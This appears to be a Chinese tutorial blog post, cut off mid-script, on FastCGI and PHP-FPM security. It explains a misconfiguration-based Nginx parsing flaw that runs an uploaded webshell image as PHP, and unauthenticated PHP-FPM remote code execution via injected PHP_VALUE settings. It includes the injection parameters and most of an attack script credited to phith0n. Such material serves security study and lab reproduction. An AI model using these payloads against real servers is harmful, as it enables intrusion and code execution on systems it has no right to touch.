    <content type="html"><![CDATA[<p>PHP-FPM 是 FastCGI 的一个具体实现（协议解析器）</p><p>Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给FPM，然后FPM按照fastcgi的协议将TCP流解析成真正的数据</p><p>举个例子，用户访问<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>，如果web目录是&#x2F;var&#x2F;www&#x2F;html，那么Nginx会将这个请求变成如下key-value对：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#123;<br>    &#x27;GATEWAY_INTERFACE&#x27;<span class="hljs-punctuation">:</span> &#x27;FastCGI/1.0&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;REQUEST_METHOD&#x27;<span class="hljs-punctuation">:</span> &#x27;GET&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SCRIPT_FILENAME&#x27;<span class="hljs-punctuation">:</span> &#x27;/var/www/html/index.php&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SCRIPT_NAME&#x27;<span class="hljs-punctuation">:</span> &#x27;/index.php&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;QUERY_STRING&#x27;<span class="hljs-punctuation">:</span> &#x27;?a=1&amp;b=2&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;REQUEST_URI&#x27;<span class="hljs-punctuation">:</span> &#x27;/index.php?a=1&amp;b=2&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;DOCUMENT_ROOT&#x27;<span class="hljs-punctuation">:</span> &#x27;/var/www/html&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SERVER_SOFTWARE&#x27;<span class="hljs-punctuation">:</span> &#x27;php/fcgiclient&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;REMOTE_ADDR&#x27;<span class="hljs-punctuation">:</span> &#x27;127.0.0.1&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;REMOTE_PORT&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">1234</span>5&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SERVER_ADDR&#x27;<span class="hljs-punctuation">:</span> &#x27;127.0.0.1&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SERVER_PORT&#x27;<span class="hljs-punctuation">:</span> &#x27;80&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SERVER_NAME&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;localhost&quot;</span><span class="hljs-punctuation">,</span><br>    &#x27;SERVER_PROTOCOL&#x27;<span class="hljs-punctuation">:</span> &#x27;HTTP/1.1&#x27;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中<code>SCRIPT_FILENAME</code>的值就是要执行的文件</p><h1 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h1><p><em>该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞</em></p><p>1：由于<code>nginx.conf</code>的错误配置导致<code>nginx</code>把以<code>.php</code>结尾的文件交给<code>fastcgi</code>处理，为此可以构造<code>upload/1.png/1.php</code>（1.png是上传的文件，包含一句话木马）</p><p>2：但是<code>fastcgi</code>在处理<code>1.php</code>文件时发现文件并不存在，这时<code>php.ini</code>配置文件中<code>cgi.fix_pathinfo=1</code>发挥作用，这项配置用于修复路径，如果当前路径不存在则采用上层路径。为此这里交由<code>fastcgi</code>处理的文件就变成了<code>/1.png</code>，最后将<code>1.png</code>的内容当成php解析</p><p>漏洞复现地址：<a href="https://github.com/vulhub/vulhub/tree/master/nginx/nginx_parsing_vulnerability">https://github.com/vulhub/vulhub/tree/master/nginx/nginx_parsing_vulnerability</a></p><h1 id="php-fpm未授权导致的任意代码执行"><a href="#php-fpm未授权导致的任意代码执行" class="headerlink" title="php-fpm未授权导致的任意代码执行"></a>php-fpm未授权导致的任意代码执行</h1><p>PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，伪装成Web服务器中间件和 PHP-FPM 通信，这就造成了 PHP-FPM 的未授权访问漏洞</p><p>在此基础上，我们可以设置 PHP-FPM 的两个环境变量：<code>PHP_VALUE</code>和<code>PHP_ADMIN_VALUE</code>。它们的作用就是用来设置PHP配置项的</p><p>通过将PHP配置项<code>auto_prepend_file</code>或<code>auto_append_file</code>的值设置成<code>php://input</code>，就能在执行<code>SCRIPT_FILENAME</code>指向的文件时进行包含body内容，从而执行我们自定义的恶意代码</p><p>设置包含的条件还需要开启<code>allow_url_include = On</code>(远程文件包含)</p><p>综合起来，如下所示</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#123;<br>    &#x27;GATEWAY_INTERFACE&#x27;<span class="hljs-punctuation">:</span> &#x27;FastCGI/1.0&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;REQUEST_METHOD&#x27;<span class="hljs-punctuation">:</span> &#x27;GET&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SCRIPT_FILENAME&#x27;<span class="hljs-punctuation">:</span> &#x27;/var/www/html/index.php&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SCRIPT_NAME&#x27;<span class="hljs-punctuation">:</span> &#x27;/index.php&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;QUERY_STRING&#x27;<span class="hljs-punctuation">:</span> &#x27;?a=1&amp;b=2&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;REQUEST_URI&#x27;<span class="hljs-punctuation">:</span> &#x27;/index.php?a=1&amp;b=2&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;DOCUMENT_ROOT&#x27;<span class="hljs-punctuation">:</span> &#x27;/var/www/html&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SERVER_SOFTWARE&#x27;<span class="hljs-punctuation">:</span> &#x27;php/fcgiclient&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;REMOTE_ADDR&#x27;<span class="hljs-punctuation">:</span> &#x27;127.0.0.1&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;REMOTE_PORT&#x27;<span class="hljs-punctuation">:</span> &#x27;<span class="hljs-number">1234</span>5&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SERVER_ADDR&#x27;<span class="hljs-punctuation">:</span> &#x27;127.0.0.1&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SERVER_PORT&#x27;<span class="hljs-punctuation">:</span> &#x27;80&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;SERVER_NAME&#x27;<span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;localhost&quot;</span><span class="hljs-punctuation">,</span><br>    &#x27;SERVER_PROTOCOL&#x27;<span class="hljs-punctuation">:</span> &#x27;HTTP/1.1&#x27;<br>    &#x27;PHP_VALUE&#x27;<span class="hljs-punctuation">:</span> &#x27;auto_prepend_file = php://input&#x27;<span class="hljs-punctuation">,</span><br>    &#x27;PHP_ADMIN_VALUE&#x27;<span class="hljs-punctuation">:</span> &#x27;allow_url_include = On&#x27;<br>&#125;<br></code></pre></td></tr></table></figure><p>来自phith0n的攻击脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><br><span class="hljs-comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span><br><br>PY2 = <span class="hljs-literal">True</span> <span class="hljs-keyword">if</span> sys.version_info.major == <span class="hljs-number">2</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bchr</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-keyword">if</span> PY2:<br>        <span class="hljs-keyword">return</span> force_bytes(<span class="hljs-built_in">chr</span>(i))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([i])<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bord</span>(<span class="hljs-params">c</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(c, <span class="hljs-built_in">int</span>):<br>        <span class="hljs-keyword">return</span> c<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">ord</span>(c)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">force_bytes</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">bytes</span>):<br>        <span class="hljs-keyword">return</span> s<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> s.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;strict&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">force_text</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">issubclass</span>(<span class="hljs-built_in">type</span>(s), <span class="hljs-built_in">str</span>):<br>        <span class="hljs-keyword">return</span> s<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">bytes</span>):<br>        s = <span class="hljs-built_in">str</span>(s, <span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;strict&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        s = <span class="hljs-built_in">str</span>(s)<br>    <span class="hljs-keyword">return</span> s<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">FastCGIClient</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span><br><br>    <span class="hljs-comment"># private</span><br>    __FCGI_VERSION = <span class="hljs-number">1</span><br><br>    __FCGI_ROLE_RESPONDER = <span class="hljs-number">1</span><br>    __FCGI_ROLE_AUTHORIZER = <span class="hljs-number">2</span><br>    __FCGI_ROLE_FILTER = <span class="hljs-number">3</span><br><br>    __FCGI_TYPE_BEGIN = <span class="hljs-number">1</span><br>    __FCGI_TYPE_ABORT = <span class="hljs-number">2</span><br>    __FCGI_TYPE_END = <span class="hljs-number">3</span><br>    __FCGI_TYPE_PARAMS = <span class="hljs-number">4</span><br>    __FCGI_TYPE_STDIN = <span class="hljs-number">5</span><br>    __FCGI_TYPE_STDOUT = <span class="hljs-number">6</span><br>    __FCGI_TYPE_STDERR = <span class="hljs-number">7</span><br>    __FCGI_TYPE_DATA = <span class="hljs-number">8</span><br>    __FCGI_TYPE_GETVALUES = <span class="hljs-number">9</span><br>    __FCGI_TYPE_GETVALUES_RESULT = <span class="hljs-number">10</span><br>    __FCGI_TYPE_UNKOWNTYPE = <span class="hljs-number">11</span><br><br>    __FCGI_HEADER_SIZE = <span class="hljs-number">8</span><br><br>    <span class="hljs-comment"># request state</span><br>    FCGI_STATE_SEND = <span class="hljs-number">1</span><br>    FCGI_STATE_ERROR = <span class="hljs-number">2</span><br>    FCGI_STATE_SUCCESS = <span class="hljs-number">3</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, host, port, timeout, keepalive</span>):<br>        <span class="hljs-variable language_">self</span>.host = host<br>        <span class="hljs-variable language_">self</span>.port = port<br>        <span class="hljs-variable language_">self</span>.timeout = timeout<br>        <span class="hljs-keyword">if</span> keepalive:<br>            <span class="hljs-variable language_">self</span>.keepalive = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-variable language_">self</span>.keepalive = <span class="hljs-number">0</span><br>        <span class="hljs-variable language_">self</span>.sock = <span class="hljs-literal">None</span><br>        <span class="hljs-variable language_">self</span>.requests = <span class="hljs-built_in">dict</span>()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__connect</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        <span class="hljs-variable language_">self</span>.sock.settimeout(<span class="hljs-variable language_">self</span>.timeout)<br>        <span class="hljs-variable language_">self</span>.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># if self.keepalive:</span><br>        <span class="hljs-comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span><br>        <span class="hljs-comment"># else:</span><br>        <span class="hljs-comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-variable language_">self</span>.sock.connect((<span class="hljs-variable language_">self</span>.host, <span class="hljs-built_in">int</span>(<span class="hljs-variable language_">self</span>.port)))<br>        <span class="hljs-keyword">except</span> socket.error <span class="hljs-keyword">as</span> msg:<br>            <span class="hljs-variable language_">self</span>.sock.close()<br>            <span class="hljs-variable language_">self</span>.sock = <span class="hljs-literal">None</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">repr</span>(msg))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__encodeFastCGIRecord</span>(<span class="hljs-params">self, fcgi_type, content, requestid</span>):<br>        length = <span class="hljs-built_in">len</span>(content)<br>        buf = bchr(FastCGIClient.__FCGI_VERSION) \<br>               + bchr(fcgi_type) \<br>               + bchr((requestid &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>               + bchr(requestid &amp; <span class="hljs-number">0xFF</span>) \<br>               + bchr((length &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>               + bchr(length &amp; <span class="hljs-number">0xFF</span>) \<br>               + bchr(<span class="hljs-number">0</span>) \<br>               + bchr(<span class="hljs-number">0</span>) \<br>               + content<br>        <span class="hljs-keyword">return</span> buf<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__encodeNameValueParams</span>(<span class="hljs-params">self, name, value</span>):<br>        nLen = <span class="hljs-built_in">len</span>(name)<br>        vLen = <span class="hljs-built_in">len</span>(value)<br>        record = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> nLen &lt; <span class="hljs-number">128</span>:<br>            record += bchr(nLen)<br>        <span class="hljs-keyword">else</span>:<br>            record += bchr((nLen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) \<br>                      + bchr((nLen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + bchr((nLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + bchr(nLen &amp; <span class="hljs-number">0xFF</span>)<br>        <span class="hljs-keyword">if</span> vLen &lt; <span class="hljs-number">128</span>:<br>            record += bchr(vLen)<br>        <span class="hljs-keyword">else</span>:<br>            record += bchr((vLen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) \<br>                      + bchr((vLen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + bchr((vLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + bchr(vLen &amp; <span class="hljs-number">0xFF</span>)<br>        <span class="hljs-keyword">return</span> record + name + value<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__decodeFastCGIHeader</span>(<span class="hljs-params">self, stream</span>):<br>        header = <span class="hljs-built_in">dict</span>()<br>        header[<span class="hljs-string">&#x27;version&#x27;</span>] = bord(stream[<span class="hljs-number">0</span>])<br>        header[<span class="hljs-string">&#x27;type&#x27;</span>] = bord(stream[<span class="hljs-number">1</span>])<br>        header[<span class="hljs-string">&#x27;requestId&#x27;</span>] = (bord(stream[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">8</span>) + bord(stream[<span class="hljs-number">3</span>])<br>        header[<span class="hljs-string">&#x27;contentLength&#x27;</span>] = (bord(stream[<span class="hljs-number">4</span>]) &lt;&lt; <span class="hljs-number">8</span>) + bord(stream[<span class="hljs-number">5</span>])<br>        header[<span class="hljs-string">&#x27;paddingLength&#x27;</span>] = bord(stream[<span class="hljs-number">6</span>])<br>        header[<span class="hljs-string">&#x27;reserved&#x27;</span>] = bord(stream[<span class="hljs-number">7</span>])<br>        <span class="hljs-keyword">return</span> header<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__decodeFastCGIRecord</span>(<span class="hljs-params">self, buffer</span>):<br>        header = buffer.read(<span class="hljs-built_in">int</span>(<span class="hljs-variable language_">self</span>.__FCGI_HEADER_SIZE))<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> header:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            record = <span class="hljs-variable language_">self</span>.__decodeFastCGIHeader(header)<br>            record[<span class="hljs-string">&#x27;content&#x27;</span>] = <span class="hljs-string">b&#x27;&#x27;</span><br>            <br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;contentLength&#x27;</span> <span class="hljs-keyword">in</span> record.keys():<br>                contentLength = <span class="hljs-built_in">int</span>(record[<span class="hljs-string">&#x27;contentLength&#x27;</span>])<br>                record[<span class="hljs-string">&#x27;content&#x27;</span>] += buffer.read(contentLength)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;paddingLength&#x27;</span> <span class="hljs-keyword">in</span> record.keys():<br>                skiped = buffer.read(<span class="hljs-built_in">int</span>(record[<span class="hljs-string">&#x27;paddingLength&#x27;</span>]))<br>            <span class="hljs-keyword">return</span> record<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">request</span>(<span class="hljs-params">self, nameValuePairs=&#123;&#125;, post=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>.__connect():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br><br>        requestId = random.randint(<span class="hljs-number">1</span>, (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">16</span>) - <span class="hljs-number">1</span>)<br>        <span class="hljs-variable language_">self</span>.requests[requestId] = <span class="hljs-built_in">dict</span>()<br>        request = <span class="hljs-string">b&quot;&quot;</span><br>        beginFCGIRecordContent = bchr(<span class="hljs-number">0</span>) \<br>                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \<br>                                 + bchr(<span class="hljs-variable language_">self</span>.keepalive) \<br>                                 + bchr(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span><br>        request += <span class="hljs-variable language_">self</span>.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,<br>                                              beginFCGIRecordContent, requestId)<br>        paramsRecord = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> nameValuePairs:<br>            <span class="hljs-keyword">for</span> (name, value) <span class="hljs-keyword">in</span> nameValuePairs.items():<br>                name = force_bytes(name)<br>                value = force_bytes(value)<br>                paramsRecord += <span class="hljs-variable language_">self</span>.__encodeNameValueParams(name, value)<br><br>        <span class="hljs-keyword">if</span> paramsRecord:<br>            request += <span class="hljs-variable language_">self</span>.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)<br>        request += <span class="hljs-variable language_">self</span>.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="hljs-string">b&#x27;&#x27;</span>, requestId)<br><br>        <span class="hljs-keyword">if</span> post:<br>            request += <span class="hljs-variable language_">self</span>.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)<br>        request += <span class="hljs-variable language_">self</span>.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="hljs-string">b&#x27;&#x27;</span>, requestId)<br><br>        <span class="hljs-variable language_">self</span>.sock.send(request)<br>        <span class="hljs-variable language_">self</span>.requests[requestId][<span class="hljs-string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_SEND<br>        <span class="hljs-variable language_">self</span>.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>] = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.__waitForResponse(requestId)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__waitForResponse</span>(<span class="hljs-params">self, requestId</span>):<br>        data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            buf = <span class="hljs-variable language_">self</span>.sock.recv(<span class="hljs-number">512</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">len</span>(buf):<br>                <span class="hljs-keyword">break</span><br>            data += buf<br><br>        data = BytesIO(data)<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            response = <span class="hljs-variable language_">self</span>.__decodeFastCGIRecord(data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> response:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \<br>                    <span class="hljs-keyword">or</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:<br>                <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:<br>                    <span class="hljs-variable language_">self</span>.requests[<span class="hljs-string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR<br>                <span class="hljs-keyword">if</span> requestId == <span class="hljs-built_in">int</span>(response[<span class="hljs-string">&#x27;requestId&#x27;</span>]):<br>                    <span class="hljs-variable language_">self</span>.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>] += response[<span class="hljs-string">&#x27;content&#x27;</span>]<br>            <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:<br>                <span class="hljs-variable language_">self</span>.requests[requestId]<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-variable language_">self</span>.host, <span class="hljs-variable language_">self</span>.port)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&#x27;Php-fpm code execution vulnerability client.&#x27;</span>)<br>    parser.add_argument(<span 